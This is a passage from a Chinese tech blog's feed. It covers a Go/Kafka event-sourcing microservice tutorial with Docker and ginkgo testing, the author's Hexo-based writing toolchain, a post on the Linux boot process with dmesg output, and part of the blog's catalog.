int32) &#123; kafka := newKafkaConsumer() defer kafka.Close() //注：开发环境中我们使用sarama.OffsetOldest，Kafka将从创建以来第一条消息开始发送。 //在生产环境中切换为sarama.OffsetNewest,只会将最新生成的消息发送给我们。 consumer, err := kafka.ConsumePartition(topic, partition, sarama.OffsetOldest) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) os.Exit(-1) &#125; go consumeEvents(consumer) fmt.Println("Press [enter] to exit consumer\n") bufio.NewReader(os.Stdin).ReadString('\n') fmt.Println("Terminating...")&#125; Go语言通过goroutine提供了对于并发编程的直接支持，goroutine是Go语言运行库的功能，作为一个函数入口，在堆上为其分配的一个堆栈。所以它非常廉价，我们可以很轻松的创建上万个goroutine，但它们并不是被操作系统所调度执行。除了被系统调用阻塞的线程外，Go运行库最多会启动$GOMAXPROCS个线程来运行goroutine。 goroutines: A goroutine is a lightweight thread of execution. channels: Channels are the pipes that connect concurrent goroutines. (&lt;- operator) for: for is Go’s only looping construct. Here are three basic types of for loops. select: Go’s select lets you wait on multiple channel operations. Non-Blocking Channel Operations 12345678910111213141516171819202122232425262728293031323334353637383940414243func consumeEvents(consumer sarama.PartitionConsumer) &#123; var msgVal []byte var log interface&#123;&#125; var logMap map[string]interface&#123;&#125; var bankAccount *BankAccount var err error for &#123; //goruntine exec select &#123; // blocking &lt;- channel operator case err := &lt;-consumer.Errors(): fmt.Printf("Kafka error: %s\n", err) case msg := &lt;-consumer.Messages(): msgVal = msg.Value // if err = json.Unmarshal(msgVal, &amp;log); err != nil &#123; fmt.Printf("Failed parsing: %s", err) &#125; else &#123; logMap = log.(map[string]interface&#123;&#125;) logType := logMap["Type"] fmt.Printf("Processing %s:\n%s\n", logMap["Type"], string(msgVal)) switch logType &#123; case "CreateEvent": event := new(CreateEvent) if err = json.Unmarshal(msgVal, &amp;event); err == nil &#123; bankAccount, err = event.Process() &#125; default: fmt.Println("Unknown command: ", logType) &#125; if err != nil &#123; fmt.Printf("Error processing: %s\n", err) &#125; else &#123; fmt.Printf("%+v\n\n", *bankAccount) &#125; &#125; &#125; &#125;&#125; 重构main12345678910111213141516171819202122232425262728package main//main.go//支持producer和consumer启动模式import ( "flag" ...)func main() &#123; act := flag.String("act", "producer", "Either: producer or consumer") partition := flag.String("partition", "0", "Partition which the consumer program will be subscribing") flag.Parse() fmt.Printf("Welcome to go-microservice : %s\n\n", *act) switch *act &#123; case "producer": mainProducer() case "consumer": if part32int, err := strconv.ParseInt(*partition, 10, 32); err == nil &#123; mainConsumer(int32(part32int)) &#125; &#125;&#125; 通过–act参数，可以启动一个消费者进程。当进程运行时，他将从Kafka一个一个拿出消息进行处理，按照我们之前在每个事件定义的Process() 方法。 12345678910$ go build$ ./go-microservice --act=consumerWelcome to go-microservice : consumerPress [enter] to exit consumerProcessing CreateEvent:&#123;"AccId":"49a23d27-4ffe-4c86-ab9a-fbc308ecff1c","Type":"CreateEvent","AccName":"Yanrui"&#125;&#123;Id:49a23d27-4ffe-4c86-ab9a-fbc308ecff1c Name:Yanrui Balance:0&#125;Terminating... 集群化消息消费者问题：如果一个Consumer宕机了怎么办？（例如：程序崩溃、网络异常等原因）解决方案：将多个Consumer编组为集群实现高可用。具体来说就是打标签，当有一个新的Log发送时，Kafka将其发送给其中一个实例。当该实例无法接收Log时，Kafka将Log传递给另一个包含相同标签的Consumer。注意：Kafka 版本 0.9 +，另外还需要使用sarama-cluster库 12#使用govendor获取govendor fetch github.com/bsm/sarama-cluster 1234567891011121314151617181920212223//修改mainConsumer方法使用sarama-cluster library连接Kafkaconfig := cluster.NewConfig()config.Consumer.Offsets.Initial = sarama.OffsetNewestconsumer, err := cluster.NewConsumer(brokers, "go-microservice-consumer", topics, config)//topics定义var ( topics = []string&#123;topic&#125;)//调整consumeEvents()case err, more := &lt;-consumer.Errors(): if more &#123; fmt.Printf("Kafka error: %s\n", err) &#125;//consumer.Messages() : MarkOffset//consumer.go//func mainConsumer(partition int32)consumer.MarkOffset(msg, "") //增加的行msgVal = msg.Value 即使程序崩溃，MarkOffset也会将消息标记为 processed ,标签包括元数据以及这个时间点的状态。元数据可以被另外一个Consumer恢复数据状态，也就能被重新消费。即即使同样的消息被处理两次，结果也是一样的，这个过程理论上是 幂等 的（idempotent）。 1234//运行多个consumer实例$ ./go-microservice --act=consumer$ ./go-microservice --act=consumer$ ./go-microservice --act=consumer 第三部分：测试驱动开发、Docker部署和持续集成使用vendor管理Golang项目依赖用govendor fetch 新增的第三方包直接被get到根目录的vendor文件夹下,不会与其它的项目混用第三方包，完美避免多个项目同用同一个第三方包的不同版本问题。只需要对vendor/vendor.json进行版本控制，即可对第三包依赖关系进行控制。 123456$ //$ go get -u github.com/kardianos/govendor$ cd $PROJECT_PATH$ govendor init$ govendor add +external$ 单元测试：ginkgo Test Suite ginkgo gomega 12345$ go get github.com/onsi/ginkgo/ginkgo$ go get github.com/onsi/gomega$ ginkgo bootstrapGenerating ginkgo test suite bootstrap for main in: go_microservice_suite_test.go 1234567891011121314151617181920package main_test//go_microservice_suite_test.go,单元测试类import ( "github.com/onsi/ginkgo" "github.com/onsi/gomega")var _ = Describe("Event", func() &#123; Describe("NewCreateAccountEvent", func() &#123; It("can create a create account event", func() &#123; name := "John Smith" event := NewCreateAccountEvent(name) Expect(event.AccName).To(Equal(name)) Expect(event.AccId).NotTo(BeNil()) Expect(event.Type).To(Equal("CreateEvent")) &#125;) &#125;)&#125;) 123456789$ ginkgoRunning Suite: go-microservice Suite==========================Random Seed: 1490709758Will run 1 of 1 specsRan 1 of 1 Specs in 0.000 secondsSUCCESS! -- 1 Passed | 0 Failed | 0 Pending | 0 Skipped PASSGinkgo ran 1 suite in 905.68195msTest Suite Passed 单元测试的四个阶段 Setup 启动 Execution 执行 Verification 验证 Teardown 拆卸 Docker部署Docker 容器中需要包含下列组件： Golang Redis、Kafka 微服务依赖的其它组件 在根目录创建一个Dockerfile12FROM golang:1.8.0MAINTAINER Yanrui 1234567891011121314151617181920//install our dependenciesRUN go get -u github.com/kardianos/govendorRUN go get github.com/onsi/ginkgo/ginkgoRUN go get github.com/onsi/gomega//将整个目录拷贝到容器ADD . /go/src/go-microservice//检查工作目录WORKDIR /go/src/go-microservice//安装依赖项RUN govendor sync//测试$ docker build -t go-microservice .$ docker run -i -t go-microservice /bin/bash$ ginkgo..............................Failed.......... 由于容器本地并没有一个Redis实例运行在上面，这时运行ginkgo测试就会报错。我们为什么不在这个Dockerfile中包含一个Redis呢？这就违背了Docker分层解耦的初衷，我们可以通过docker-compose将两个服务连接起来一起工作。 创建一个docker-compose.yml文件（与Dockerfile目录一致）:123456789101112version: "2.0"services: app: environment: REDIS_URL: redis:6379 build: . working_dir: /go/src/go-microservice links: - redis redis: image: redis:alpine 本地构建完成之后，再次运行 docker-compose run app ginkgo 测试通过。 Infrastructure as Code(基础设施即代码) The enabling idea of infrastructure as code is that the systems and devices which are used to run software can be treated as if they, themselves, are software. — Kief Morris 云带来的好的一方面是它让公司中的任何人都可以轻松部署、配置和管理他们需要的基础设施。虽然很多基础设施团队采用了云和自动化技术，却没有采用相应的自动化测试和发布流程。它们把这些当作一门过于复杂的脚本语言来使用。他们会为每一次具体的改动编写手册、配置文件和执行脚本，再针对一部分指定的服务器手工运行它们，也就是说每一次改动都还需要花费专业知识、时间和精力。这种工作方式意味着基础设施团队没有把他们自己从日常的重复性劳动中解放出来。目前已经有很多商业云平台提供了Docker服务，只需要将自己的 git repository 链接到平台，即可以自动帮你完成部署，在云上完成集成测试。 12docker-compose builddocker-compose run app ginkgo 扩展阅读：开源架构技术漫谈 Stack Overflow：2017年最赚钱的编程语言 DevOps 漫谈：基于OpenCensus构建分布式跟踪系统 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 数据可视化（七）Graphite 体系结构详解 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献Theory 康威定律 Mike Amundsen 《远距离条件下的康威定律——分布式世界中实现团队构建》 Kief Morris《Infrastructure as Code - Managing Servers in the Cloud》 InfoQ:《Infrastructure as Code》书评与摘要Microservices (推荐)Martin Fowler : Microservices 李颖杰：为什么要重构到微服务（案例） Using GraphQL with Microservices in Go Event Sourcing (推荐) Writing and Testing an Event Sourcing Microservice with Kafka and Go Linkedin Profile:Adam Pahlevi Baihaqi (推荐) OKONKWO VINCENT IKEM:Building Scalable Applications Using Event Sourcing and CQRS (推荐)Microsoft Azure:Event Sourcing 张逸:对CQRS的基础理解 汤雪华：领域驱动设计之领域模型 汤雪华：什么是事件溯源（Event Sourcing） InfoQ:A Whole System Based on Event Sourcing is an Anti-PatternZookeeper &amp; Kafka Kafka QuickStart Apache.org:Kafka 0.9 Consumer Rewrite Design Quora:What is the actual role of ZooKeeper in Kafka? grokbase:Relationship between Zookeeper and Kafka 朱赟:白话 IT 之要不要从 rabbitMQ 转 kafka？]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>Developer</tag>
        <tag>OpenSource</tag>
        <tag>Database</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的写作工具链]]></title>
    <url>%2F2017%2F06%2F03%2FWriting-WriterToolChain%2F</url>
    <content type="text"><![CDATA[摘要 工欲善其事，必先利其器 Question OmniFouse: 项目和上下文分类设置还比较混乱，有待重构 Ulysses：多种样式效果不佳（图片连接、代码块） 编辑发布流程:目前的方式（local-&gt;Blog(markdown),review-&gt;微信公众号），内容粘贴到公众号编辑器还需要比较多手工处理，未统一微信发布内容样式表。 Mac:如何设置左手 方向键 ？ （右手仍然需要鼠标的情况下） PPT:vm win下正常，mac下英文字母乱码 Texture：一个优雅的开源学术论文书写工具 Classic Papers:谷歌学术推出“经典论文”排行 失效链接（图片、外部链接）自动检测 Historyv6 （ Current ）项目管理工具 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 文献管理工具 文献管理软件 Papers 网站管理工具 在线截屏工具 screendump 用户只要输入网址，就会显示各种设备的网页截屏。 写作编辑工具 LaTex 语法:全面增强数学公式支持 add Atom plugin : markdown-preview-enhanced [预览、提纲、公式增强] add hexo kramed replace hexo marked,enable mathjax Latex Style 单行公式： $s=a+b$ Latex Style 多行公式： $$\frac{\partial u}{\partial t}= h^2 \left( \frac{\partial^2 u}{\partial x^2} +\frac{\partial^2 u}{\partial y^2} +\frac{\partial^2 u}{\partial z^2}\right)$$ KaTeX Style (markdown-preview-enhanced)：[E=mc^2] disable hexo gitment comment plugin add 留言箱 https://github.com/riboseyim/riboseyim.com.comment Styled Terminal Markdown Viewer mdv 在终端下渲染出 Markdown 文档的样式，包含多个主题、支持表格、源代码高亮显示、文件更改监视等功能。 project mdv github link 1$ pip install mdv v5:20181124 域名管理工具 add 独立域名 https://riboseyim.com [Ribose Yim’s Tech Blog] 【腾讯云】 故障修复：图床域名更换 xxx.clouddn.com to http://riboseyim-qiniu.riboseyim.com 【七牛云】 add hexo theme Cafe fix hexo search feature -&gt; google search add gitment comment auto syn workflow: from riboseyim.github.io to project riboseyim.com add Xmind replace MindManager,201807 add slides maker:landslide | 试用 hacker slides 123456789101112131415161718# 主题$ git clone https://github.com/giscafer/hexo-theme-cafe.git themes/cafe# 素材链接替换$ grep 'clouddn.com' ./*.md | awk -F '(' '&#123;print $2&#125;' | awk -F '.com' '&#123;print $1&#125;' &gt; oldomain.log$ sort -n oldomain.log | uniq &gt; oldomin.listhttp://o8m8ngokc.bkt.clouddn.comhttp://og2061b3n.bkt.clouddn.comhttp://ogtqvs10n.bkt.clouddn.comhttp://okkuj60pj.bkt.clouddn.comhttp://omaxozji3.bkt.clouddn.comhttp://omb2onfvy.bkt.clouddn.comhttp://ombx24fbq.bkt.clouddn.comhttp://osgiyhxhy.bkt.clouddn.comhttp://ot6idm48o.bkt.clouddn.comhttp://p11slcnom.bkt.clouddn.com$ gsed -e "s/old/new/g" sourcefile &gt; targetfile 1$ landslide Machine-Learning-Algorithms.md -i -o &gt; test.html &amp;&amp; open test.html 12345678910111213141516171819## pip 安装$ sudo pip install landslideThe directory '/Users/yanrui/Library/Caches/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.The directory '/Users/yanrui/Library/Caches/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.Collecting landslideRequirement already satisfied: Markdown in /usr/local/lib/python2.7/site-packages (from landslide) (2.6.11)Requirement already satisfied: Jinja2 in /usr/local/lib/python2.7/site-packages (from landslide) (2.10)Requirement already satisfied: docutils in /usr/local/lib/python2.7/site-packages (from landslide) (0.14)Requirement already satisfied: Pygments in /usr/local/lib/python2.7/site-packages (from landslide) (2.2.0)Requirement already satisfied: six in /usr/local/lib/python2.7/site-packages (from landslide) (1.11.0)Requirement already satisfied: MarkupSafe&gt;=0.23 in /usr/local/lib/python2.7/site-packages (from Jinja2-&gt;landslide) (1.0)Installing collected packages: landslideSuccessfully installed landslide-1.1.3## 源码安装$ git clone https://github.com/adamzap/landslide.git$ cd landslide$ python setup.py build$ sudo python setup.py install v4:201801 可视化图表 数据可视化（五）基于网络爬虫制作可视化图表 程序化内容生成 基于 Node.js 实现程序化文本编辑 基于 Graphviz 实现程序化绘图 图片处理（Photoshop):批处理与动作 Blog generator(hexo):优化内容页脚模版、修复google/baidu site xml 问题、修复https兼容问题 1vi /theme/yilia/layout/_partial/article.ejs 编辑管理工具 扩展 Markdown 源文件编辑工具集（nodejs-based） 前期需求： 1）源文件持续修改中出现的回归编辑工作，互相引用的链接较多2）兼容现有的 Blog Generator (Hexo) 便于融合使用3）支持 command-line 模式便于调用 后续目标：1）专题模板一次编辑，多处插入2）主体自动聚合，类似维基（Template talk） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970var fs = require('fs-extra');var path = require('path');// All paths are relative to package.json.var pagesPath = './source/_posts';var copyFolders = ['./images', './css', './js'];var outputPath = './tmp';// First delete everything in the tmp directory.console.log('Cleaning previous tmp...');try &#123; for (var file of fs.readdirSync(outputPath))&#123; fs.removeSync(path.join(outputPath, file)); &#125;&#125;catch (err)&#123; console.log('Error during cleanup: '+err); process.exit(1);&#125;// Then read everything in the pages directories.var pages = &#123;&#125;, pagesMeta = &#123;&#125;;console.log('Loading pages...');try &#123; for(var page of fs.readdirSync(pagesPath))&#123; pages[page] = fs.readFileSync(path.join(pagesPath,page),'utf8'); &#125;&#125;catch (err)&#123; console.log('Error during page loading: '+err); process.exit(1);&#125;// Generate each page from the data provided, using the template.console.log('Generating pages...');try &#123; for(var page of Object.entries(pages)) &#123; var pageFullName = page[0]; var pageName = page[0].slice(0, page[0].lastIndexOf('.')); var metaData = pagesMeta.hasOwnProperty(pageName+'.json') var source_file = pagesPath +'/'+ pageFullName; var target_file = outputPath +'/'+ pageFullName; //console.log(pageFullName); if(source_file.lastIndexOf('.md')&gt;0)&#123; var source_str = 'http:\\/\\/riboseyim.github.io'; var target_str = 'https:\\/\\/riboseyim.github.io'; var exec = require('child_process').exec; var cmdStr = 'gsed -e "s/'+source_str+'/'+target_str+'/g" ' + source_file + ' &gt; ' + target_file; console.log(cmdStr); exec(cmdStr, function(err,stdout,stderr)&#123; if(err) &#123; console.log('exec error:'+stderr); &#125; else &#123; //console.log(stdout); &#125; &#125;); &#125; &#125;&#125;catch (err)&#123; console.log('Error during page generation: '+err); process.exit(1);&#125;console.log('--------------Done!--------------------'); v3:201706 更新内容OmniFouse: 计划管理、进度提醒数据容灾：统一使用坚果云摄影处理：图片像素、大小处理OmniGraffle：存量数据合并整理，空间布局／样式配色技巧升级图床：云存储分库、图片命名、批处理Evernote、Ulysses：一般性创意素材从Evernote迁移到UlyssesAtom: 发布定稿前版本采用Atom作为编辑器GitBook: 《Linux Perf Master》 反馈极好版权骑士: 效果不佳，remove v2:201701 分享：从Evernote到Ulysses 更新内容摄影器材：微单。效果较好的场景：园林、博物馆、航展OmniGraffle：高级应用技能：图层、统一样式、配色技巧图床：采用七牛云Evernote：及时检阅、分类、删除剪辑内容GitBook: 新手入门Blog generator(hexo): 优化Markdown–&gt;Html自动生成、发布流程 v1:201606 分享：思维利器OmniGraffle 更新内容：Evernote：素材仓库支持所有手机、平板和电脑。在任意一台设备打开Evernote，随时记录一切、轻松收集资料、一键演示笔记、高效协作共享。 MindManager：框架梳理一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，MindManager可以辅助进行思维整理、分析、可视化的工具。比如写这篇的时候，就是现在MindManager梳理了一个概要，之后导出为文本作为底稿。 OmniGraffle：思维可视化由The Omni Group制作的一款绘图软件，它曾获得苹果设计奖。可以支持流程图、逻辑图、模型设计等，堪称万能绘图神器。这年头大家都挺忙的，能用一张图表达的意图，就不用写一大堆字啦。 Markdown：一次编写，到处发表Markdown标记语言，我其实很久以前就掌握了，但是使用频率很低，也谈不上什么美感。真正推动我把Markdown纳入个人工具箱的也是写作，可以说是相辅相成吧。它最大的意义在于通过极简的形式，解决了写作成果的移植通用性的问题。 Ulysses：样式精美、版本管理、ZoomIn/ZoomOut 版权骑士：打击盗版，人人有责。 “维权骑士”有一套自己的监测系统。签约作者用发表的文章，都会纳入“维权骑士”的监测系统，并与各公众号、网站发布内容进行“比对”。一旦发现抄袭，将负责代表作者维护版权。 扩展阅读 最佳写作实践：从Evernote到Ulysses 技术团队中的作家 我的写作工具链 Kanban 看板管理实践精要 数据可视化（一）思维利器 OmniGraffle 绘图指南 参考文献 利用 Atom 为自己打造一个专属 Markdown 编辑器 如何在 hexo 中支持 Mathjax？ 使用Atom打造无懈可击的Markdown编辑器 参考文献管理最佳实践]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>eBook</tag>
        <tag>工具癖</tag>
        <tag>Mac</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works:Boots]]></title>
    <url>%2F2017%2F05%2F29%2FLinux-Works-Boots%2F</url>
    <content type="text"><![CDATA[摘要 一、How the Linux Kernel Boots 二、How User Space Starts 三、The Initial RAM filesystem 史蒂夫·乔布斯（Steve Jobs）：“假设你可以缩短10秒钟的开机时间，把这个乘上500万，那就是每天5000万秒了。一年下来大概是好几十辈子的时间。想想看，如果你可以让开机速度快10秒钟的话，就拯救了数十条生命。这很值得啊，你不觉得吗？” 《硅谷革命：成就苹果公司的疯狂往事》 How the Linux Kernel Boots The machine’s BIOS or boot firmware loads and runs a boot loader.(Boot Loader 是在操作系统内核运行之前运行的一段小程序，它严重地依赖于硬件而实现) The boot loader finds the kernel image on disk, loads it into memory, and starts it. （选择内核镜像，加载到内存空间，为最终调用操作系统内核准备好正确的环境。） The kernel initializes the devices and its drivers.（初始化硬件设备及其驱动程序） The kernel mounts the root filesystem.（挂载根目录。根目录指文件系统的最上一级目录，它是相对子目录来说的；它如同一棵大树的“根”一般，所有的树杈以它为起点） The kernel starts a program called init with a process ID of 1. This point is the user space start.（内核启动一个初始化程序，从这里开始虚拟内存开始划分出使用者空间，与内核空间（Kernel space）对应） init sets the rest of the system processes in motion At some point, init starts a process allowing you to log in, usually at the end or near the end of the boot. Startup Messages有两种方式可以查看内核引导和运行诊断信息： 查看内核系统日志文件。文件路径： /var/log/kern.log 执行dmesg命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859[root@li1437-101 ~]# dmesg[ 0.000000] Linux version 4.9.7-x86_64-linode80 (maker@build) (gcc version 4.7.2 (Debian 4.7.2-5) ) #2 SMP Thu Feb 2 15:43:55 EST 2017[ 0.000000] Command line: root=/dev/sda console=tty1 console=ttyS0 ro devtmpfs.mount=1[ 0.000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'[ 0.000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'[ 0.000000] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'[ 0.000000] x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256[ 0.000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.[ 0.000000] x86/fpu: Using 'eager' FPU context switches.[ 0.000000] e820: BIOS-provided physical RAM map:…….[ 0.000000] NX (Execute Disable) protection: active[ 0.000000] SMBIOS 2.8 present.[ 0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.9.1-0-gb3ef39f-prebuilt.qemu-project.org 04/01/2014[ 0.000000] Hypervisor detected: KVM……[ 0.371925] raid6: sse2x1 gen() 7490 MB/s[ 0.428689] raid6: sse2x1 xor() 5953 MB/s[ 0.485463] raid6: sse2x2 gen() 9289 MB/s[ 0.542230] raid6: sse2x2 xor() 6754 MB/s[ 0.599013] raid6: sse2x4 gen() 10954 MB/s[ 0.656189] raid6: sse2x4 xor() 5522 MB/s[ 0.656943] raid6: using algorithm sse2x4 gen() 10954 MB/s[ 0.657588] raid6: .... xor() 5522 MB/s, rmw enabled……[ 1.053697] Netfilter messages via NETLINK v0.30.[ 1.054471] nfnl_acct: registering with nfnetlink.[ 1.055332] nf_conntrack version 0.5.0 (8192 buckets, 32768 max)[ 1.056324] ctnetlink v0.93: registering with nfnetlink.[ 1.057335] nf_tables: (c) 2007-2009 Patrick McHardy &lt;kaber@trash.net&gt;[ 1.058393] nf_tables_compat: (c) 2012 Pablo Neira Ayuso &lt;pablo@netfilter.org&gt;[ 1.059599] xt_time: kernel timezone is -0000[ 1.060296] ip_set: protocol 6[ 1.060791] IPVS: Registered protocols (TCP, UDP, SCTP, AH, ESP)[ 1.061940] IPVS: Connection hash table configured (size=4096, memory=64Kbytes)[ 1.063162] IPVS: Creating netns size=2104 id=0[ 1.064139] IPVS: ipvs loaded.……[ 1.744221] systemd[1]: Detected virtualization kvm.[ 1.745058] systemd[1]: Detected architecture x86-64.[ 1.747402] systemd[1]: Set hostname to &lt;localhost.localdomain&gt;.[ 1.834328] tsc: Refined TSC clocksource calibration: 2800.119 MHz[ 1.835512] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x285cb16f950, max_idle_ns: 440795333193 ns[ 1.843476] systemd[1]: Created slice Root Slice.[ 1.844251] systemd[1]: Starting Root Slice.[ 1.845835] systemd[1]: Created slice System Slice.[ 1.846631] systemd[1]: Starting System Slice.[ 1.848257] systemd[1]: Listening on udev Kernel Socket.[ 1.849119] systemd[1]: Starting udev Kernel Socket.[ 2.014715] EXT4-fs (sda): re-mounted. Opts: (null)[ 2.038202] systemd-journald[2010]: Received request to flush runtime journal from PID 1[ 2.241341] audit: type=1305 audit(1488188850.897:2): audit_pid=2215 old=0 auid=4294967295 ses=4294967295 res=1[ 2.287758] Adding 262140k swap on /dev/sdb. Priority:-1 extents:1 across:262140k FS[ 2.905177] IPVS: Creating netns size=2104 id=1[ 2.954613] IPv6: ADDRCONF(NETDEV_UP): eth0: link is not ready[ 2.955987] 8021q: adding VLAN 0 to HW filter on device eth0[ 8.009765] random: crng init done 在故障排查中，dmesg信息需要首先查看,例如输出最近10条系统信息,可以查看到引起性能问题的错误。12345678$ dmesg | tail[1880957.563150] perl invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0[...][1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child[1880957.563408] Killed process 18694 (perl) total-vm:1972392kB, anon-rss:1953348kB, file-rss:0kB[2320864.954447] TCP: Possible SYN flooding on port 7001. Dropping request. Check SNMP counters. Kernel initialization and Boot Options在启动时，Linux内核初始化的顺序如下： CPU inspection （检查CPU） Memory inspection （检查内存） Device bus discovery （发现设备总线） Device discovery （发现设备） Auxiliary kernel subsystem setup(networking, and so on) （辅助内核子系统启动，例如网络等） Root filesystem mount （挂载根目录） User space start （用户空间启动） Kernel Parameters文件/proc/cmdline记录了系统内核启动参数：12[root@li1437-101 ~]# cat /proc/cmdlineroot=/dev/sda console=tty1 console=ttyS0 ro devtmpfs.mount=1 查看运行级别：123[root@li1437-101 ~]# who -r run-level 3 2017-02-27 09:47[root@li1437-101 ~]# 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 《Linux 的启动过程》，白崎博生，2004 （暂无中文版） 《深入理解 Linux 内核》，Daniel P.Bovert （经典） Inside the Linux boot process linfo.org:Root Filesystem Definition 阮一峰：Systemd 入门教程：命令篇 阮一峰：Systemd 入门教程：实战篇 IBM developerworks:浅析 Linux 初始化 init 系统，第 3 部分: Systemd 维基百科：Systemd differences between ramfs and tmpfs Unix Background (Signal、Messages &amp; Queue) | Simon Hørup Eskildsen (推荐) How the Kernel Manages Your Memory | Gustavo Duarte (推荐) What Your Computer Does While You Wait | Gustavo Duarte (推荐) What Does an Idle CPU Do? | Gustavo Duarte]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RiboseYim's Blog Root Catalog]]></title>
    <url>%2F2017%2F05%2F26%2FCatalog%2F</url>
    <content type="text"><![CDATA[摘要 一、Autobiography | 我的自传 二、过程改进 &amp; 方法论 三、Information Technology Map 项目 一级 二级 三级 四级 应用 科学 数学 数据科学 数据可视化 物理 生物 医学 工程 建筑 建筑工程项目管理 通信 协议 计算机 编程语言 操作系统Linux 网络安全 云计算 项目管理信息系统 管理 会计 管理 项目管理 PMP 经济 公共 军事 指挥 法律 政策 公共政策 林肯研究 文化 社会 国际关系 心理 情报/智能 写作 电子书 历史 清史 艺术 艺术评论 待解决问题 Automatic update directory 一、Autobiography | 我的自传 我的 2019 年度盘点 我的 2018 年度盘点 我的 2017 年度盘点 我的 2016 年度盘点 我的 2012 阅读书单 About RiboseYim 二、过程改进 &amp; 方法论 工程师的自我修养：全英文技术学习实践 嗑药简史：关于瘾品，成瘾机制及其历史 嗑药简史（四）：咖啡上瘾，喝还是不喝？ DevOps 漫谈：从作坊到工厂的寓言故事 DevOps 漫谈：Kanban看板管理实践精要 最佳写作实践：从Evernote到Ulysses 我的写作工具链 我的电子书列表 最佳思维利器 OmniGraffle for Mac 藏书与阅读 知识产权法（Intellectual Property）概要 待完善Study The Master 待完善工具集 三、Information Technology DevOps 漫谈：从作坊到工厂的寓言故事 软件工程实践中的十大法则 谁是王者：macOS vs Linux Kernels ？ AI数学&amp;算法 数学常识|如何度量复杂性 读书笔记|数学之美（Beauty Of Mathmetics） 概率论基础：从马尔可夫模型（Markov Model）到贝叶斯网络 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 PriviewMachine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 Machine Learning:人工智能媒体报道集 Machine Learning:自然语言处理技术简报 经济学人：计算机如何学习人类语言？ 通信协议 计算机 RFC 文档 TCP | UDP | gRPC 开发语言 Compiler,编译原理 C | Java | Perl | Ruby | Python | Node | R | Go 源代码版本管理：Git 玩转编程语言:构建自定义代码生成器 Coder:代码工具、命名、自动生成及其它技巧 Stack Overflow：2017年最赚钱的编程语言 Linux 操作系统 Linux 常用命令一百条 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单(Netflix版) Linux 性能诊断：荐书|《图解性能优化》 Linux 性能诊断：荐书|《Linux Perf Master》 Linux 性能诊断：Web应用性能优化 Linux 性能诊断：基于 Ganglia 实现集群性能态势感知 系统系统架构：从珠海航展交通管控实践谈起 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux DevOps 漫谈：基于OpenCensus构建分布式跟踪系统 信息安全 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: 